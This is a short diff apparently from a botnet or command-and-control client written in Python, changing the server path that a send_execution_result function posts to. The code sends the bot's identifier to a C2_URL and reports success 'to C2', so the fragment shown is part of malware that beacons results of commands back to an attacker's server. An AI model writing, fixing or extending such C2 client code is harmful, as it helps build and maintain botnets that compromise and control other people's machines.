@@ -119,7 +119,7 @@ def send_execution_result():
         payload = {
             "mac": BOT_ID,
         }
-        response = requests.post(C2_URL + "post_result/", json=payload)
+        response = requests.post(C2_URL + "result/", json=payload)
         if response.status_code == 200:
             print("[+] Successfully sent execution result to C2.")
         else:
